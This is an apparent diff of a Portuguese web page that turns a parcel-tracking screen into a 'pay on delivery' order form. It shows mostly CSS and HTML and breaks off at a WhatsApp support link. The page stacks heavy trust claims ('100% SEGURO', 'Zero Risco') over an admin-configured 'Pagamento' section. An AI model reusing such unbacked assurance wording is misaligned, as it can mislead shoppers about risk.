@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rastreamento de Pedidos</title>
+<title>Pagamento na Entrega &middot; Receba Primeiro, Pague Depois</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
 *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -15,12 +15,15 @@
   --primary-hover: #0F3A33;
   --teal: #0D9488;
   --teal-hover: #0F766E;
+  --teal-light: #E6F4F1;
+  --green: #10B981;
+  --green-dark: #059669;
   --font-main: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
 }
 
 body {
   font-family: var(--font-main);
-  background-color: #F9FAFB;
+  background-color: #F8FAFC;
   color: #111827;
   -webkit-font-smoothing: antialiased;
   min-height: 100vh;
@@ -31,36 +34,53 @@ body {
 
 a { color: inherit; text-decoration: none; }
 button { font-family: inherit; cursor: pointer; border: none; outline: none; }
-input { font-family: inherit; }
+input, select { font-family: inherit; }
+
+/* ============ TOP TRUST BAR ============ */
+.top-trust-bar {
+  background: #0B2924;
+  color: #A7F3D0;
+  font-size: 12.5px;
+  font-weight: 700;
+  text-align: center;
+  padding: 8px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  letter-spacing: 0.3px;
+}
+.top-trust-bar svg { width: 15px; height: 15px; flex-shrink: 0; color: #34D399; }
 
 /* ============ HERO & TOP BAR ============ */
 .hero-wrapper {
-  background: linear-gradient(135deg, #14453D 0%, #1a5a4f 50%, #0f3a33 100%);
-  padding-bottom: 48px;
+  background: linear-gradient(135deg, #14453D 0%, #17544a 55%, #0d3630 100%);
+  padding-bottom: 24px;
   position: relative;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
 }
 
 .top-bar-container {
   max-width: 680px;
   margin: 0 auto;
-  padding: 20px 20px 0;
+  padding: 18px 20px 0;
   display: flex;
   align-items: center;
-  justify-content: center;
+  justify-content: space-between;
 }
 
 .header-logo-pill {
-  background: rgba(255, 255, 255, 0.95);
+  background: rgba(255, 255, 255, 0.96);
   border-radius: 12px;
-  padding: 8px 18px;
+  padding: 8px 16px;
   display: flex;
   align-items: center;
   gap: 10px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+  box-shadow: 0 2px 8px rgba(0,0,0,0.12);
 }
 
 .header-logo-pill img {
-  height: 24px;
+  height: 22px;
   width: auto;
   object-fit: contain;
 }
@@ -71,398 +91,468 @@ input { font-family: inherit; }
   letter-spacing: 0.5px;
   background: #E6F4F1;
   color: #14453D;
-  font-weight: 700;
+  font-weight: 800;
   padding: 3px 8px;
   border-radius: 6px;
+}
+
+.security-badge-top {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  color: #ECFDF5;
+  font-size: 12px;
+  font-weight: 700;
+  background: rgba(255, 255, 255, 0.12);
+  padding: 6px 12px;
+  border-radius: 999px;
+  backdrop-filter: blur(4px);
+  border: 1px solid rgba(255, 255, 255, 0.15);
+}
+
+.security-badge-top svg {
+  width: 14px;
+  height: 14px;
+  color: #34D399;
 }
 
 .hero-content {
   max-width: 680px;
   margin: 0 auto;
-  padding: 28px 20px 0;
+  padding: 24px 20px 0;
   text-align: center;
 }
 
 .hero-icon-box {
-  width: 60px;
-  height: 60px;
-  margin: 0 auto 14px;
+  width: 58px;
+  height: 58px;
+  margin: 0 auto 12px;
   display: flex;
   align-items: center;
   justify-content: center;
+  background: rgba(255, 255, 255, 0.12);
+  border-radius: 16px;
+  backdrop-filter: blur(6px);
+  border: 1px solid rgba(255, 255, 255, 0.22);
 }
 
 .hero-icon-box svg {
-  width: 50px;
-  height: 50px;
-  color: #FFFFFF;
+  width: 32px;
+  height: 32px;
+  color: #34D399;
 }
 
 .hero-title {
   color: #FFFFFF;
-  font-size: 30px;
+  font-size: 28px;
   font-weight: 800;
-  margin-bottom: 8px;
+  margin-bottom: 6px;
   letter-spacing: -0.5px;
 }
 
 .hero-subtitle {
-  color: rgba(255, 255, 255, 0.85);
-  font-size: 15px;
+  color: rgba(255, 255, 255, 0.9);
+  font-size: 14.5px;
   font-weight: 400;
+  max-width: 520px;
+  margin: 0 auto;
+  line-height: 1.45;
 }
 
-/* ============ FLOATING FORM ============ */
+/* ============ MAIN CONTAINER ============ */
 .main-container {
   max-width: 680px;
   width: 100%;
-  margin: -24px auto 0;
-  padding: 0 20px 60px;
+  margin: -10px auto 0;
+  padding: 0 18px 60px;
   position: relative;
   z-index: 10;
   flex: 1;
 }
 
-.search-form-card {
+/* ============ ZERO RISK BANNER ============ */
+.zero-risk-banner {
+  background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
+  border: 1px solid #A7F3D0;
+  border-radius: 16px;
+  padding: 14px 18px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 18px;
+  box-shadow: 0 2px 8px rgba(16, 185, 129, 0.08);
+}
+
+.zero-risk-icon {
+  width: 38px;
+  height: 38px;
+  border-radius: 10px;
+  background: #10B981;
+  color: #FFFFFF;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.zero-risk-icon svg { width: 22px; height: 22px; }
+
+.zero-risk-text h4 {
+  font-size: 14px;
+  font-weight: 800;
+  color: #065F46;
+  margin-bottom: 2px;
+}
+.zero-risk-text p {
+  font-size: 12.5px;
+  color: #047857;
+  line-height: 1.35;
+}
+
+/* ============ CARD BOX ============ */
+.card-box {
   background: #FFFFFF;
   border-radius: 18px;
-  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
-  padding: 10px;
+  padding: 22px;
+  border: 1px solid #E2E8F0;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04);
+  margin-bottom: 18px;
+}
+
+.card-title-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 16px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid #F1F5F9;
+}
+
+.card-title-group {
   display: flex;
   align-items: center;
   gap: 10px;
 }
 
-.input-wrapper {
-  position: relative;
-  flex: 1;
-}
-
-.input-icon {
-  position: absolute;
-  left: 16px;
-  top: 50%;
-  transform: translateY(-50%);
-  color: #9CA3AF;
-  width: 18px;
-  height: 18px;
-  pointer-events: none;
-}
-
-.search-input {
-  width: 100%;
-  padding: 14px 16px 14px 44px;
-  background: #F9FAFB;
-  border: 1px solid #E5E7EB;
-  border-radius: 12px;
-  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-  font-size: 14px;
-  color: #1F2937;
-  outline: none;
-  transition: all 0.15s;
-}
-
-.search-input:focus {
-  background: #FFFFFF;
-  border-color: var(--teal);
-  box-shadow: 0 0 0 3px rgba(13, 148, 136, 0.15);
-}
-
-.search-btn {
+.card-step-badge {
+  width: 26px;
+  height: 26px;
+  border-radius: 8px;
   background: var(--teal);
   color: #FFFFFF;
-  font-weight: 700;
-  font-size: 14px;
-  padding: 14px 24px;
-  border-radius: 12px;
-  white-space: nowrap;
-  transition: background 0.15s, opacity 0.15s;
-}
-
-.search-btn:hover:not(:disabled) {
-  background: var(--teal-hover);
-}
-
-.search-btn:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
-
-.search-helper-text {
-  text-align: center;
-  font-size: 12px;
-  color: #6B7280;
-  margin-top: 12px;
-}
-
-/* ============ ALERTS ============ */
-.alert-error {
-  margin-top: 20px;
-  background: #FEF2F2;
-  border: 1px solid #FEE2E2;
-  color: #991B1B;
-  padding: 14px 18px;
-  border-radius: 14px;
-  text-align: center;
-  font-size: 14px;
-  font-weight: 500;
-}
-
-.alert-cpf-banner {
-  margin-top: 20px;
-  background: #F0FDFA;
-  border: 1px solid #CCFBF1;
-  color: #134E4A;
-  padding: 12px 16px;
-  border-radius: 14px;
-  font-size: 14px;
-  text-align: center;
-  font-weight: 600;
-}
-
-/* ============ RESULT CARDS ============ */
-.results-wrapper {
-  margin-top: 24px;
-  display: flex;
-  flex-direction: column;
-  gap: 16px;
-}
-
-.card-box {
-  background: #FFFFFF;
-  border-radius: 18px;
-  padding: 24px;
-  border: 1px solid #E5E7EB;
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-}
-
-.card-brand-logo {
-  height: 28px;
-  width: auto;
-  object-fit: contain;
-  margin-bottom: 16px;
-  display: block;
-}
-
-.tracking-code-label {
   font-size: 13px;
-  color: #6B7280;
-  margin-bottom: 4px;
-  font-weight: 500;
-}
-
-.tracking-code-value {
-  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-  font-size: 24px;
   font-weight: 800;
-  color: #111827;
-  letter-spacing: 0.5px;
-}
-
-.status-badge {
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-  background: #ECFDF5;
-  border: 1px solid #D1FAE5;
-  color: #065F46;
-  padding: 6px 14px;
-  border-radius: 9999px;
-  font-size: 13px;
-  font-weight: 700;
-  margin-top: 14px;
-}
-
-.status-badge-dot {
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: #10B981;
-}
-
-.info-two-col {
-  margin-top: 18px;
-  background: #F9FAFB;
-  border: 1px solid #F3F4F6;
-  border-radius: 14px;
-  padding: 16px;
   display: flex;
-  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+
+.card-title-text {
+  font-size: 16px;
+  font-weight: 800;
+  color: #0F172A;
+}
+
+.order-summary-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  background: #F8FAFC;
+  padding: 14px 16px;
+  border-radius: 14px;
+  border: 1px solid #EDF2F7;
+}
+
+.product-info-left {
+  display: flex;
+  align-items: center;
   gap: 14px;
 }
 
-.info-item {
-  display: flex;
-  align-items: flex-start;
-  gap: 12px;
-}
-
-.info-icon-sq {
-  width: 38px;
-  height: 38px;
-  border-radius: 8px;
+.product-img-box {
+  width: 50px;
+  height: 50px;
+  border-radius: 10px;
   background: #FFFFFF;
-  border: 1px solid #E5E7EB;
+  border: 1px solid #E2E8F0;
   display: flex;
   align-items: center;
   justify-content: center;
   color: var(--teal);
   flex-shrink: 0;
+  overflow: hidden;
+}
+.product-img-box svg { width: 26px; height: 26px; }
+
+.product-title {
+  font-size: 14.5px;
+  font-weight: 700;
+  color: #0F172A;
+  margin-bottom: 3px;
 }
 
-.info-icon-sq svg { width: 18px; height: 18px; }
+.product-tag-free {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  color: #047857;
+  background: #D1FAE5;
+  padding: 2px 7px;
+  border-radius: 6px;
+}
 
-.info-item-label {
-  font-size: 12px;
-  color: #6B7280;
+.product-price-box {
+  text-align: right;
+  flex-shrink: 0;
+}
+
+.price-sub-label {
+  font-size: 11px;
+  color: #64748B;
+  font-weight: 600;
+  text-transform: uppercase;
+}
+
+.price-total-val {
+  font-size: 21px;
+  font-weight: 800;
+  color: #14453D;
+}
+
+.payment-timing-notice {
+  margin-top: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 14px;
+  background: #FEF3C7;
+  border: 1px solid #FDE68A;
+  border-radius: 12px;
+  font-size: 12.5px;
+  color: #92400E;
+  font-weight: 600;
+}
+.payment-timing-notice span:last-child {
+  font-weight: 800;
+  color: #78350F;
+}
+
+/* ============ FORM FIELDS GRID (12-COL AUTO COMPACT) ============ */
+.form-grid {
+  display: grid;
+  grid-template-columns: repeat(12, minmax(0, 1fr));
+  gap: 14px;
+  grid-auto-flow: dense;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+/* Larguras proporcionais para compactação perfeita */
+.col-span-12 { grid-column: span 12; } /* 100% - Linha Inteira (Grande) */
+.col-span-8  { grid-column: span 8; }  /* ~66% - Dois Terços */
+.col-span-6  { grid-column: span 6; }  /* 50% - Meia Linha (Médio) */
+.col-span-4  { grid-column: span 4; }  /* 33.3% - 1/3 da Linha (Pequeno) */
+.col-span-3  { grid-column: span 3; }  /* 25% - 1/4 da Linha (Compacto) */
+
+/* Compatibilidade com seletores antigos */
+.form-group.col-span-2 { grid-column: span 12; }
+
+@media (max-width: 640px) {
+  .col-span-3 { grid-column: span 6; }
+  .col-span-4 { grid-column: span 6; }
+}
+
+@media (max-width: 440px) {
+  .col-span-8, .col-span-6, .col-span-4, .col-span-3 {
+    grid-column: span 12;
+  }
+}
+
+.form-label {
+  font-size: 13px;
+  font-weight: 700;
+  color: #334155;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.required-star {
+  color: #EF4444;
+}
+
+.custom-input {
+  width: 100%;
+  padding: 12px 14px;
+  background: #F8FAFC;
+  border: 1px solid #CBD5E1;
+  border-radius: 12px;
+  font-size: 14px;
+  color: #0F172A;
+  outline: none;
+  transition: all 0.2s;
+}
+
+.custom-input:focus {
+  background: #FFFFFF;
+  border-color: var(--teal);
+  box-shadow: 0 0 0 3px rgba(13, 148, 136, 0.15);
+}
+
+/* ============ SUBMIT BUTTON ============ */
+.submit-btn {
+  width: 100%;
+  background: linear-gradient(135deg, #0D9488 0%, #0F766E 100%);
+  color: #FFFFFF;
+  padding: 16px 24px;
+  border-radius: 14px;
+  font-size: 15.5px;
+  font-weight: 800;
+  letter-spacing: 0.3px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  box-shadow: 0 10px 25px -4px rgba(13, 148, 136, 0.4);
+  transition: all 0.2s;
+  cursor: pointer;
+  margin-top: 14px;
+}
+
+.submit-btn svg {
+  width: 20px !important;
+  height: 20px !important;
+  max-width: 20px !important;
+  max-height: 20px !important;
+  flex-shrink: 0 !important;
+}
+
+.submit-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 14px 28px -4px rgba(13, 148, 136, 0.48);
+}
+
+/* ============ PILLARS / BADGES ============ */
+.trust-pillars-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 10px;
+  margin-top: 24px;
+}
+
+.pillar-card {
+  background: #FFFFFF;
+  border: 1px solid #E2E8F0;
+  border-radius: 12px;
+  padding: 12px 10px;
+  text-align: center;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+}
+
+.pillar-card svg {
+  width: 24px;
+  height: 24px;
+  color: var(--teal);
+  margin-bottom: 6px;
+}
+
+.pillar-card h6 {
+  font-size: 11.5px;
+  font-weight: 800;
+  color: #1E293B;
   margin-bottom: 2px;
 }
 
-.info-item-value {
-  font-size: 14.5px;
-  font-weight: 700;
-  color: #111827;
+.pillar-card p {
+  font-size: 10.5px;
+  color: #64748B;
+  line-height: 1.25;
 }
 
-.delivery-estimate-card {
-  margin-top: 18px;
-  background: #F0FDF4;
-  border: 1px solid #BBF7D0;
-  border-radius: 12px;
-  padding: 14px 16px;
-  display: flex;
-  align-items: center;
-  gap: 12px;
+/* ============ SUCCESS VIEW ============ */
+#success-card {
+  display: none;
+  background: #FFFFFF;
+  border-radius: 20px;
+  padding: 32px 24px;
+  text-align: center;
+  border: 1px solid #E2E8F0;
+  box-shadow: 0 15px 35px -5px rgba(0,0,0,0.08);
 }
 
-.estimate-icon {
-  width: 38px;
-  height: 38px;
-  border-radius: 10px;
-  background: #DCFCE7;
-  color: #15803D;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-}
-.estimate-icon svg { width: 20px; height: 20px; }
-
-.estimate-label {
-  font-size: 11.5px;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-  color: #166534;
-  font-weight: 700;
-}
-
-.estimate-value {
-  font-size: 14.5px;
-  font-weight: 800;
-  color: #14532D;
-  margin-top: 2px;
-}
-
-.product-summary-line {
-  margin-top: 16px;
-  font-size: 13.5px;
-  color: #4B5563;
-}
-
-.product-summary-line strong {
-  color: #111827;
-}
-
-/* ============ TIMELINE ============ */
-.timeline-title {
-  font-size: 20px;
-  font-weight: 800;
-  color: #111827;
-  margin-bottom: 24px;
-}
-
-.timeline-list {
-  display: flex;
-  flex-direction: column;
-}
-
-.timeline-event {
-  position: relative;
-  display: flex;
-  gap: 16px;
-}
-
-.timeline-event:not(:last-child) .timeline-connector {
-  position: absolute;
-  left: 23px;
-  top: 50px;
-  bottom: -4px;
-  width: 2px;
-  background: #0D9488;
-}
-
-.timeline-icon-bubble {
-  position: relative;
-  z-index: 2;
-  width: 48px;
-  height: 48px;
+.success-check-bubble {
+  width: 64px;
+  height: 64px;
+  background: #D1FAE5;
+  color: #059669;
   border-radius: 50%;
-  background: #0D9488;
-  color: #FFFFFF;
+  margin: 0 auto 16px;
   display: flex;
   align-items: center;
   justify-content: center;
-  box-shadow: 0 4px 10px rgba(13, 148, 136, 0.25);
-  flex-shrink: 0;
-  ring: 4px solid #CCFBF1;
+  box-shadow: 0 0 0 8px #ECFDF5;
+}
+.success-check-bubble svg { width: 34px; height: 34px; }
+
+.success-title {
+  font-size: 24px;
+  font-weight: 800;
+  color: #0F172A;
+  margin-bottom: 8px;
 }
 
-.timeline-icon-bubble svg { width: 22px; height: 22px; }
-
-.timeline-body {
-  flex: 1;
-  padding-bottom: 28px;
-}
-
-.timeline-event-header {
-  display: flex;
-  align-items: baseline;
-  justify-content: space-between;
-  gap: 12px;
-  flex-wrap: wrap;
-  margin-bottom: 4px;
-}
-
-.timeline-event-title {
-  font-size: 15.5px;
-  font-weight: 700;
-  color: #111827;
-}
-
-.timeline-event-date {
-  font-size: 12px;
-  color: #6B7280;
-  font-weight: 500;
-  white-space: nowrap;
-}
-
-.timeline-event-desc {
-  font-size: 13.5px;
-  color: #4B5563;
+.success-subtitle {
+  font-size: 14.5px;
+  color: #475569;
   line-height: 1.45;
+  margin-bottom: 22px;
 }
 
-.timeline-event-location {
+.order-receipt-box {
+  background: #F8FAFC;
+  border: 1px solid #E2E8F0;
+  border-radius: 14px;
+  padding: 16px;
+  text-align: left;
+  margin-bottom: 20px;
+}
+
+.receipt-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 8px 0;
+  border-bottom: 1px solid #EDF2F7;
+  font-size: 13.5px;
+}
+.receipt-row:last-child {
+  border-bottom: none;
+  padding-bottom: 0;
+}
+.receipt-row .label { color: #64748B; font-weight: 500; }
+.receipt-row .val { color: #0F172A; font-weight: 700; text-align: right; }
+.receipt-row .val.highlight { color: #0D9488; font-weight: 800; }
+
+.btn-whatsapp-support {
+  background: #25D366;
+  color: #FFFFFF;
+  padding: 14px 20px;
+  border-radius: 12px;
+  font-size: 14.5px;
+  font-weight: 800;
   display: inline-flex;
   align-items: center;
-  gap: 5px;
-  font-size: 13px;
-  font-weight: 600;
-  color: #0D9488;
-  margin-top: 6px;
+  gap: 8px;
+  margin-top: 10px;
+  box-shadow: 0 4px 14px rgba(37, 211, 102, 0.3);
+  width: 100%;
+  justify-content: center;
 }
-
-.timeline-event-location svg { width: 14px; height: 14px; }
 
 /* ============ FOOTER ============ */
 .site-footer {
@@ -474,325 +564,442 @@ input { font-family: inherit; }
 }
 
 .site-footer img {
-  height: 24px;
+  height: 22px;
   width: auto;
   object-fit: contain;
-  opacity: 0.75;
+  opacity: 0.8;
   margin: 0 auto 8px;
   display: block;
 }
 
 .site-footer p {
   font-size: 12px;
-  color: #6B7280;
+  color: #64748B;
 }
 
 @media (max-width: 640px) {
-  .hero-title { font-size: 26px; }
-  .search-form-card { flex-direction: column; }
-  .search-btn { width: 100%; }
+  .hero-title { font-size: 24px; }
+  .form-grid { grid-template-columns: 1fr; }
+  .form-group.col-span-2 { grid-column: span 1; }
+  .trust-pillars-row { grid-template-columns: 1fr; }
   .card-box { padding: 18px; }
-  .tracking-code-value { font-size: 20px; }
 }
 </style>
 </head>
 <body>
 
+<!-- TOP TRUST BAR -->
+<div class="top-trust-bar">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+  <span>PAGUE SOMENTE NO RECEBIMENTO &middot; 100% SEGURO &middot; SEM DADOS DE CARTÃO ONLINE</span>
+</div>
+
 <!-- HERO & TOPBAR -->
 <div class="hero-wrapper">
   <div class="top-bar-container">
     <div class="header-logo-pill">
-      <img src="logo.png" alt="Logo">
-      <span class="portal-tag">Rastreamento</span>
+      <img src="logo.png" alt="Logo" onerror="this.src='logo.jpg'">
+      <span class="portal-tag">Pague na Entrega</span>
     </div>
-  </div>
-
-  <div class="hero-content">
-    <div class="hero-icon-box">
-      <!-- 3D Package Cube Icon -->
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z"/>
-        <path d="M12 22V12"/>
-        <polyline points="3.29 7 12 12 20.71 7"/>
-        <path d="m7.5 4.27 9 5.15"/>
-      </svg>
+    <div class="security-badge-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
+      <span>Zero Risco</span>
     </div>
-    <h1 class="hero-title">Rastreie seu Pedido</h1>
-    <p class="hero-subtitle">Acompanhe o status de entrega em tempo real</p>
   </div>
 </div>
 
-<!-- MAIN SEARCH & RESULTS -->
+<!-- MAIN CONTAINER -->
 <main class="main-container">
-  
-  <!-- Floating Form -->
-  <form class="search-form-card" id="tracking-form" onsubmit="handleTrackSubmit(event)">
-    <div class="input-wrapper">
-      <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-      <input type="text" id="tracking-input" placeholder="BR123456789BZ ou CPF" class="search-input" autocomplete="off" oninput="handleInputChange()">
+
+  <!-- ORDER FORM CONTAINER -->
+  <form id="cod-order-form" onsubmit="handleOrderSubmit(event)">
+
+    <!-- CARD 1: Resumo do Produto -->
+    <div class="card-box">
+      <div class="card-title-header">
+        <div class="card-title-group">
+          <div class="card-step-badge">1</div>
+          <h3 class="card-title-text">Resumo do Pedido</h3>
+        </div>
+        <span class="portal-tag" style="background: #ECFDF5; color: #047857;">Pronto p/ Envio</span>
+      </div>
+
+      <div class="order-summary-row">
+        <div class="product-info-left">
+          <div class="product-img-box">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+          </div>
+          <div>
+            <h4 class="product-title" id="display-product-name">Carregando Produto...</h4>
+            <span class="product-tag-free">
+              <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+              Frete Grátis com Seguro
+            </span>
+          </div>
+        </div>
+
+        <div class="product-price-box">
+          <div class="price-sub-label">Total a pagar na entrega</div>
+          <div class="price-total-val" id="display-product-price">R$ 0,00</div>
+        </div>
+      </div>
     </div>
-    <button type="submit" id="tracking-btn" class="search-btn" disabled>Rastrear</button>
+
+    <!-- CARD 2: Campos Dinâmicos de Entrega -->
+    <div class="card-box">
+      <div class="card-title-header">
+        <div class="card-title-group">
+          <div class="card-step-badge">2</div>
+          <h3 class="card-title-text">Pagamento</h3>
+        </div>
+      </div>
+
+      <div class="form-grid" id="dynamic-fields-container">
+        <!-- Campos gerados dinamicamente com base nas configurações do admin -->
+      </div>
+    </div>
+
+    <!-- BOTÃO FINALIZAR -->
+    <button type="submit" id="btn-submit-order" class="submit-btn">
+      <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" style="width: 20px; height: 20px; flex-shrink: 0;"><polyline points="20 6 9 17 4 12"/></svg>
+      <span id="display-btn-text">REALIZAR PAGAMENTO</span>
+    </button>
   </form>
 
-  <p class="search-helper-text">Digite o código de rastreio (BR + 9 dígitos + BZ) ou seu CPF</p>
+  <!-- CARD DE SUCESSO / CONFIRMAÇÃO (APÓS ENVIAR) -->
+  <div id="success-card">
+    <div class="success-check-bubble">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h2 class="success-title">Pedido Confirmado com Sucesso!</h2>
+    <p class="success-subtitle">
+      Seu pedido foi registrado para <strong>envio imediato com pagamento na entrega</strong>. Você só pagará quando receber o pacote em casa!
+    </p>
 
-  <!-- Error Alert -->
-  <div id="tracking-error" class="alert-error" style="display: none;">
-    Código de rastreio não encontrado. Verifique os dados digitados ou aguarde até 24h úteis para ativação nos Correios.
-  </div>
-
-  <!-- CPF banner -->
-  <div id="cpf-banner" class="alert-cpf-banner" style="display: none;">
-    1 pedido encontrado para este CPF
-  </div>
-
-  <!-- Results Section -->
-  <div id="tracking-results" class="results-wrapper" style="display: none;">
-
-    <!-- CARD 1: Detalhes do Envio -->
-    <div class="card-box">
-      <img src="logo.png" alt="Logo" class="card-brand-logo">
-      <div class="tracking-code-label">Código de Rastreio</div>
-      <div class="tracking-code-value" id="display-tracking-code">BR948192834BZ</div>
-
-      <div class="status-badge" id="display-badge">
-        <span class="status-badge-dot"></span>
-        <span id="display-status-text">Em Trânsito</span>
-      </div>
-
-      <div class="info-two-col">
-        <div class="info-item">
-          <div class="info-icon-sq">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-          </div>
-          <div>
-            <div class="info-item-label">Destinatário</div>
-            <div class="info-item-value" id="display-customer-name">Cliente</div>
-          </div>
-        </div>
-
-        <div class="info-item">
-          <div class="info-icon-sq">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/><circle cx="12" cy="10" r="3"/></svg>
-          </div>
-          <div>
-            <div class="info-item-label">Destino (Entrega)</div>
-            <div class="info-item-value" id="display-city">São Paulo / SP</div>
-          </div>
-        </div>
-
-        <div class="info-item">
-          <div class="info-icon-sq">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 18V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v11a1 1 0 0 0 1 1h2"/><path d="M15 18H9"/><path d="M19 18h2a1 1 0 0 0 1-1v-3.65a1 1 0 0 0-.22-.624l-3.48-4.35A1 1 0 0 0 17.52 8H14"/><circle cx="17" cy="18" r="2"/><circle cx="7" cy="18" r="2"/></svg>
-          </div>
-          <div>
-            <div class="info-item-label">Origem & Frete</div>
-            <div class="info-item-value"><span id="display-origin">Curitiba / PR</span> &middot; <span id="display-frete" style="color: var(--teal);">SEDEX Express</span></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Card de Previsão de Entrega -->
-      <div class="delivery-estimate-card" id="display-estimate-box">
-        <div class="estimate-icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-        </div>
-        <div>
-          <div class="estimate-label">Previsão Estimada de Entrega</div>
-          <div class="estimate-value" id="display-estimate-text">3 a 6 dias úteis</div>
-        </div>
-      </div>
-
-      <div class="product-summary-line">
-        Produto: <strong id="display-product">Pedido Aprovado</strong> <span id="display-qty">(x1)</span>
-      </div>
+    <div class="order-receipt-box" id="success-receipt-rows">
+      <!-- Injetado dinamicamente -->
     </div>
 
-    <!-- CARD 2: Histórico de Movimentação -->
-    <div class="card-box">
-      <h3 class="timeline-title">Histórico de Movimentação</h3>
-      <div class="timeline-list" id="timeline-container">
-        <!-- Eventos injetados dinamicamente via JS -->
-      </div>
-    </div>
+    <a id="whatsapp-btn-link" href="#" target="_blank" class="btn-whatsapp-support">
